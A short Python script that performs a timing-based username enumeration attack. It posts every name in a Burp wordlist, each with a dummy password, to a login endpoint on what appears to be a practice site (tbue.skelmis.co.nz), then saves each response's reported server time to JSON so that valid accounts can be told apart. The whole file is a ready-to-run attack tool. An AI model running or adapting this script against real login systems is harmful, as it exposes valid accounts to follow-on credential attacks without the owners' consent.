import asyncio
import json

import httpx

# 25 requests per second limiter
# It's not about overloading the server after all
semaphore = asyncio.Semaphore(25)

data: dict[str, float] = {}


async def request(ac: httpx.AsyncClient, username: str):
    async with semaphore:
        resp = await ac.post(
            "https://tbue.skelmis.co.nz/login/2",
            data={
                "username": username,
                "password": "ThisDoesntMatterHere",
            },
        )
        resp_time = float(resp.headers["X-TIME-MS"])
        data[username] = resp_time


async def main():
    async with httpx.AsyncClient() as client:
        with open("burp_user_names.txt", "r") as in_file:
            coros = [request(client, uname) for uname in in_file.readlines()]
            await asyncio.wait(coros)

    with open("overall_request_data.json", "w") as out_file:
        out_file.write(json.dumps(data, indent=4))

    print("Finished")


asyncio.run(main())
